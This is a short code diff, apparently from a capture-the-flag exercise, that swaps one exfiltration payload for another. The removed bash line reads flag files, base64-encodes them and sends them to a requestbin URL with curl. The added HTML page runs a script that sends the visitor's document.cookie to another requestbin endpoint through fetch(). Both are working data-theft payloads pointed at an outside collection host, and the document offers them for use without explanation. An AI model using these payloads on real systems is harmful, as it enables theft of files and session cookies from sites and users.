@@ -1,3 +1,14 @@
-#!/bin/bash
+<!DOCTYPE html>
+<html lang="en">
 
-curl "http://requestbin.whapi.cloud/v5c55ev5?flag=$(cat /flag* | base64)"
+<head>
+	<meta charset="UTF-8"/>
+</head>
+
+<body>
+  <script>
+    fetch("https://requestbin.whapi.cloud/1c0vt2z1?flag=" + btoa(document.cookie)).then((response) => console.log(response));
+  </script>
+</body>
+
+</html>
